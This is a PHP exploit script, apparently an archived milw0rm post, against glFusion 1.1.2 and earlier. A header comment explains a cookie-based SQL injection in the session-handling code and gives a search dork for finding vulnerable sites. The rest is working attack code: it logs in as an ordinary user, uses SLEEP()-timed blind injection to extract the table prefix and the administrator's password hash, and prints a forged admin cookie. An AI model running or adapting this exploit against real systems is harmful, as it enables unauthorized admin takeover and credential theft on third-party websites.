<?php
    /*
    glFusion <= 1.1.2 COM_applyFilter()/cookies remote blind sql injection exploit
    by Nine:Situations:Group::bookoo
     
    our site: http://retrogod.altervista.org/
    software site: http://www.glfusion.org/
     
    google dork: "Page created in" "seconds by glFusion" +RSS
     
    Found another vector of injection in /private/system/lib-session.php near lines 97-117:
    ...
    if (isset ($_COOKIE[$_CONF['cookie_session']])) {
    $sessid = COM_applyFilter ($_COOKIE[$_CONF['cookie_session']]);
    if ($_SESS_VERBOSE) {
    COM_errorLog("got $sessid as the session id from lib-sessions.php",1);
    }
     
    $userid = SESS_getUserIdFromSession($sessid, $_CONF['session_cookie_timeout'], $_SERVER['REMOTE_ADDR'], $_CONF['cookie_ip']);
     
    if ($_SESS_VERBOSE) {
    COM_errorLog("Got $userid as User ID from the session ID",1);
    }
     
    if ($userid > 1) {
    // Check user status
     
    $status = SEC_checkUserStatus($userid);
    if (($status == USER_ACCOUNT_ACTIVE) ||
    ($status == USER_ACCOUNT_AWAITING_ACTIVATION)) {
    $user_logged_in = 1;
     
    SESS_updateSessionTime($sessid, $_CONF['cookie_ip']);
     
    ...
     
    see SESS_updateSessionTime() function near lines 418-436:
     
    ...
    function SESS_updateSessionTime($sessid, $md5_based=0) {
    global $_TABLES;
     
    $newtime = (string) time();
     
    if ($md5_based == 1) {
     
    $sql = "UPDATE {$_TABLES['sessions']} SET start_time=$newtime WHERE (md5_sess_id = '$sessid')";
    } else {
     
    $sql = "UPDATE {$_TABLES['sessions']} SET start_time=$newtime WHERE (sess_id = $sessid)"; //<-------- SQL INJECTION HERE
     
    }
     
    $result = DB_query($sql);
     
    return 1;
    }
    ...
     
    if session id is not md5() hashed in general configuration, which is the default
    you can inject arbitrary SQL statements.
     
    Note that the query in SESS_getUserIdFromSession() function:
     
    ...
    if ($md5_based == 1) {
    $sql = "SELECT uid FROM {$_TABLES['sessions']} WHERE "
    . "(md5_sess_id = '$sessid') AND (start_time > $mintime) AND (remote_ip = '$remote_ip')";
    } else {
     
    $sql = "SELECT uid FROM {$_TABLES['sessions']} WHERE "
    . "(sess_id = '$sessid') AND (start_time > $mintime) AND (remote_ip = '$remote_ip')";
    }
    ...
     
    compares the supplied sessid value with the "sessid" value from sessions table which is an integer.
    Mysql, like php, in comparing them, only considers the first integer values of the supplied string.
    So the function returns a valid userid and, if you know an existent sessid in table, you can inject
    queries in cookies, like this:
     
    Cookie: glf_session=12345678 [SQL HERE]; glfusion=9999999999;
     
    This tool use delays to extract an admin hash from users table, but needs a simple user account;
     
    some improvement in find_prefix();
     
    working against MySQL >= 5.0.12, where SLEEP() function is availiable
    or ... if you find another solution for delays, with MySQL >= 4.1, which supports SELECT subqueries
    (BENCHMARK() cannot be used because commas are filtered by COM_applyFilter() function)
     
    */
     
    $err[0] = "[!] This script is intended to be launched from the cli!";
    $err[1] = "[!] You need the curl extesion loaded!";
     
    if (php_sapi_name() <> "cli") {
        die($err[0]);
    }
    if (!extension_loaded('curl')) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
        false;
        if ($win) {
            !dl("php_curl.dll") ? die($err[1]) :
            nil;
        } else {
            !dl("php_curl.so") ? die($err[1]) :
            nil;
        }
    }
     
    function syntax() {
        print (
        "Syntax: php ".$argv[0]." [host] [path] [user] [pass] [OPTIONS]         \n". "Options:                                                                 \n". "--port:[port]       - specify a port                                     \n". "                      default->80                                      \n". "--prefix            - try to extract table prefix from information.schema\n". "                      default->gl_                                     \n". "--uid:[n]           - specify an uid other than default (2,usually admin)\n". "--proxy:[host:port] - use proxy                                          \n". "--verbose           - show more informations                             \n". "--skiptest          - skip preliminary tests                             \n". "--test              - run only tests                                     \n". "Examples:   php ".$argv[0]." 192.168.0.1 /glfusion/ bookoo pass          \n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass --prefix --proxy:1.1.1.1:8080\n". "            php ".$argv[0]." 192.168.0.1 / bookoo pass --prefix --uid:3");
        die();
    }
     
    error_reporting(E_ALL ^ E_NOTICE);
    $host = $argv[1];
    $path = $argv[2];
    $_user = $argv[3];
    $_pwd = $argv[4];
     
    $prefix = "gl_";
    //default
    $uid = "2";
    $where = "uid=$uid"; //user id, usually admin, anonymous = 1
     
     
    $argv[4] ? print("[*] Attacking...\n") :
     syntax();
     
    $_f_prefix = false;
    $_use_proxy = false;
    $port = 80;
    $_skiptest = false;
    $_verbose = false;
    $_test = false;
     
    for ($i = 3; $i < $argc; $i++) {
        if (stristr($argv[$i], "--prefix")) {
            $_f_prefix = true;
        }
        if (stristr($argv[$i], "--proxy:")) {
            $_use_proxy = true;
            $tmp = explode(":", $argv[$i]);
            $proxy_host = $tmp[1];
            $proxy_port = (int)$tmp[2];
        }
        if (stristr($argv[$i], "--port:")) {
            $tmp = explode(":", $argv[$i]);
            $port = (int)$tmp[1];
        }
         
        if (stristr($argv[$i], "--uid")) {
            $tmp = explode(":", $argv[$i]);
            $uid = (int)$tmp[1];
            $where = "uid=$uid";
        }
        if (stristr($argv[$i], "--verbose")) {
            $_verbose = true;
        }
        if (stristr($argv[$i], "--skiptest")) {
            $_skiptest = true;
        }
        if (stristr($argv[$i], "--test")) {
            $_test = true;
        }
    }
     
    function _s($url, $ck, $is_post, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request."\r\n");
        }
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7");
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $cookies = array("Cookie: ".$ck);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $cookies);
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            die("[!] ".curl_error($ch)."\n");
        } else {
            curl_close($ch);
        }
        return $_d;
    }
     
    function chk_err($s) {
        if (stripos ($s, "\x41\x6e\x20\x53\x51\x4c\x20\x65\x72\x72\x6f\x72\x20\x68\x61\x73\x20\x6f\x63\x63\x75\x72\x72\x65\x64")) {
            return true;
        } else {
            return false;
        }
    }
     
    function chk_login($s) {
        if (stripos ($s, "\x50\x6c\x65\x61\x73\x65\x20\x65\x6e\x74\x65\x72\x20\x79\x6f\x75\x72\x20\x75\x73\x65\x72\x20\x6e\x61\x6d\x65\x20\x61\x6e\x64\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x62\x65\x6c\x6f\x77")) {
            die("[!] Unable to login: wrong credentials.");
        }
        if (stripos ($s, "\x59\x6f\x75\x20\x68\x61\x76\x65\x20\x65\x78\x63\x65\x65\x64\x65\x64\x20\x74\x68\x65\x20\x6e\x75\x6d\x62\x65\x72\x20\x6f\x66\x20\x61\x6c\x6c\x6f\x77\x65\x64\x20\x6c\x6f\x67\x69\x6e\x20\x61\x74\x74\x65\x6d\x70\x74\x73\x2e\x20\x20\x50\x6c\x65\x61\x73\x65\x20\x74\x72\x79\x20\x61\x67\x61\x69\x6e\x20\x6c\x61\x74\x65\x72\x2e")) {
            die("[!] You have exceeded the number of allowed login attempts.");
        }
         
    }
    function login() {
        global $url, $host, $port, $path, $_user, $_pwd, $_verbose;
        $url = "http://$host:$port".$path."users.php";
        $out = _s($url, "", 1, "loginname=$_user&passwd=$_pwd&bb2_screener_=");
        chk_login($out);
        $tmp = explode("\x0d\x0a\x0d\x0a", $out);
        $tmp = explode("\x67\x6c\x66\x5f\x73\x65\x73\x73\x69\x6f\x6e\x3d", $tmp[0]);
        $tmp = explode("\x3b", $tmp[1]);
        $sessid = (int)$tmp[0];
        !$sessid ? die("[!] Unable to login ...") :
         nil;
        if ($_verbose) {
            print "[?] sessid->".$sessid."\n";
        }
        return $sessid;
    }
     
    function tests() {
        global $host, $port, $path, $n, $delayfunc;
         
         
        $sessid = login();
        $sql = "--";
        $cookies = "glf_session=$sessid".$sql."; glfusion=9999999999;";
        $url = "http://$host:$port".$path;
        $_o = _s($url, $cookies, 0, "");
        if (chk_err($_o)) {
            print("[?] Vulnerable!\n");
        } else {
            die ("[?] Not vulnerable ...");
        }
        $sessid = login();
        $sql = " AND (CASE WHEN (SELECT 1) THEN 1 ELSE 0 END) ) LIMIT 1-- ";
        $cookies = "glf_session=$sessid".$sql."; glfusion=9999999999;";
        $_o = _s($url, $cookies, 0, "");
        if (chk_err($_o)) {
            die("[!] MySQL < 4.1!\n");
        } else {
            print("[*] Subquery works!->Mysql >= 4.1\n");
        }
        $sessid = login();
        $sql = " AND (CASE WHEN (SELECT 1) THEN 1 ELSE SLEEP(0) END) ) LIMIT 1-- ";
        $cookies = "glf_session=$sessid".$sql."; glfusion=9999999999;";
        $_o = _s($url, $cookies, 0, "");
        if (chk_err($_o)) {
            die("[!] SLEEP() function not availiable! MySQL < 5.0.12\n");
        } else {
            print("[*] SLEEP() function availiable. MySQL >= 5.0.12\n");
        }
         
        $cookies = "";
        $_z = 0;
        $_w = 10;
        for ($i = 0; $i <= $_w; $i++) {
            $starttime = time();
            $_o = _s($url, $cookies, 0, "");
            $endtime = time();
            $difftime = $endtime - $starttime;
            $_z = $_z + $difftime;
        }
        $_y = round($_z / $_w);
        $n = $n + $_y;
        if ($_y <> 0) {
            print("[*] Adjusting delay time of ".$_y." second(s)->delay = ".$n."\n");
        }
         
    }
     
     
    function find_prefix() {
        global $host, $port, $path, $delayfunc, $_user, $_pwd, $n;
         
        $_tn = "TABLE_NAME"; //case important ??
        $_ift = "information_schema.TABLES"; //??
         
        $_table_prefix = "";
        $j = -15;
        print "[*] Initiating table prefix extraction...\n";
        while (!$null_f) {
            $mn = 0x00;
            $mx = 0xff;
            while (1) {
                if (($mx + $mn) % 2 == 1) {
                    $c = round(($mx + $mn) / 2) - 1;
                } else {
                    $c = round(($mx + $mn) / 2);
                }
                $sessid = login();
                $sql = " AND (CASE WHEN (SELECT (ASCII(SUBSTR(".$_tn." FROM $j FOR 1)) >= ".$c.") FROM ".$_ift." WHERE ".$_tn." LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN $delayfunc ELSE 0 END) ) LIMIT 1-- ";
                $cookies = "glf_session=$sessid".$sql."; glfusion=9999999999;";
                $url = "http://$host:$port".$path;
                 
                $starttime = time();
                $_o = _s($url, $cookies, 0, "");
                $endtime = time();
                $difftime = $endtime - $starttime;
                 
                if (chk_err($_o)) {
                    die("\n[!] information_schema not availiable! MySQL < 5.0");
                }
                 
                if ($difftime > ($n-1)) {
                    $mn = $c;
                    sleep($n);
                } else {
                    $mx = $c - 1;
                }
                 
                if (($mx-$mn == 1) or ($mx == $mn)) {
                    $sessid = login();
                    $sql = " AND (CASE WHEN (SELECT (ASCII(SUBSTR(".$_tn." FROM $j FOR 1)) = ".$mn.") FROM ".$_ift." WHERE ".$_tn." LIKE 0x25747261636b6261636b636f646573 LIMIT 1) THEN $delayfunc ELSE 0 END) ) LIMIT 1-- ";
                    $cookies = "glf_session=$sessid".$sql."; glfusion=9999999999;";
                    $url = "http://$host:$port".$path;
                     
                    $starttime = time();
                    $_o = _s($url, $cookies, 0, "");
                    $endtime = time();
                    $difftime = $endtime - $starttime;
                     
                    if ($difftime > ($n-1)) {
                        if ($mn <> 0) {
                            $_table_prefix = chr($mn).$_table_prefix;
                        } else {
                            $null_f = true;
                        }
                    } else {
                        $_table_prefix = chr($mx).$_table_prefix;
                         
                    }
                    if (!$null_f) {
                        print ("[?] Table prefix->[??]".$_table_prefix."\n");
                    }
                    sleep($n);
                    break;
                }
            }
            $j--;
        }
        print "[?] Table prefix->".$_table_prefix."\n";
        return $_table_prefix;
    }
     
    $n = 30; //delay n seconds
     
    if (!$_skiptest) {
        print "[*] Initiating preliminary tests ...\n";
        tests();
    }
    if ($_test) {
        die();
    }
     
    $delayfunc = "SLEEP(".$n.")";
     
    if ($_f_prefix == true) {
        $prefix = find_prefix();
         
    }
     
    $c = array();
    $c = array_merge($c, range(0x30, 0x39));
    $c = array_merge($c, range(0x61, 0x66));
    $url = "http://$host:$port".$path;
    $_hash = "";
    print ("[*] Initiating hash extraction ...\n");
    for ($j = 1; $j < 0x21; $j++) {
        for ($i = 0; $i <= 0xff; $i++) {
            $f = false;
            if (in_array($i, $c)) {
                 
                $sessid = login();
                $sql = " AND (CASE WHEN (SELECT (ASCII(SUBSTR(passwd FROM $j FOR 1))=$i) FROM ".$prefix."users WHERE $where LIMIT 1) THEN $delayfunc ELSE 0 END) ) LIMIT 1-- ";
                $cookies = "glf_session=$sessid".$sql."; glfusion=9999999999;";
                $starttime = time();
                $out = _s($url, $cookies, 0, "");
                $endtime = time();
                $difftime = $endtime - $starttime;
                if (chk_err($out)) {
                    die("[!] sql error.");
                }
                if ($difftime > ($n-1)) {
                    $f = true;
                    $_hash .= chr($i);
                    print "[?] hash: ".$_hash."[??]\n";
                    sleep($n);
                    break;
                }
            }
        }
        if ($f == false) {
            die("\n[!] Unknown error ...");
        }
    }
    print "\n[*] your cookie->glfusion=".$uid."; glf_password=".$_hash."; glf_theme=nouveau;";
     
?>

# milw0rm.com [2009-04-03]
